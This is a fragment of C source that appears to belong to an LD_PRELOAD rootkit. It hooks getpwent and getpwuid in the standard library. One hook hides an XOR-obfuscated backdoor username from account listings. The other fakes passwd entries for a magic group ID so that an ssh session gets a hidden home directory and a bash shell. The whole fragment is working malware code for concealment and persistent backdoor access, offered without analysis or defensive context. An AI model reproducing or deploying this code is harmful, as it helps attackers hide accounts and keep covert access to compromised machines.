struct passwd *getpwent(void)
{
    HOOK(o_getpwent, CGETPWENT);

    struct passwd *tmp = o_getpwent();
    if(tmp && tmp->pw_name != NULL)
    {
        char *bduname=strdup(BD_UNAME); xor(bduname);
        if(!strcmp(tmp->pw_name, bduname)) { CLEAN(bduname); errno=ESRCH; return NULL; }
        CLEAN(bduname);
    }
    return tmp;
}

struct passwd *getpwuid(uid_t uid)
{
    HOOK(o_getpwuid, CGETPWUID);
    if(uid==MGID) return o_getpwuid(0);
    char *procname = cprocname();

    if(getgid() == MGID && uid == 0 && (!strcmp(procname, "ssh") || !strcmp(procname, "/usr/bin/ssh")))
    {
        struct passwd *bpw;
        bpw = o_getpwuid(uid);
        bpw->pw_uid=MGID;
        bpw->pw_gid=MGID;

        char home[256];
        char *idir=strdup(IDIR); xor(idir);
        snprintf(home, sizeof(home), "%s", idir);
        CLEAN(idir);

        bpw->pw_dir=strdup(home);
        bpw->pw_shell="/bin/bash";
        return bpw;
    }
    return o_getpwuid(uid);
}
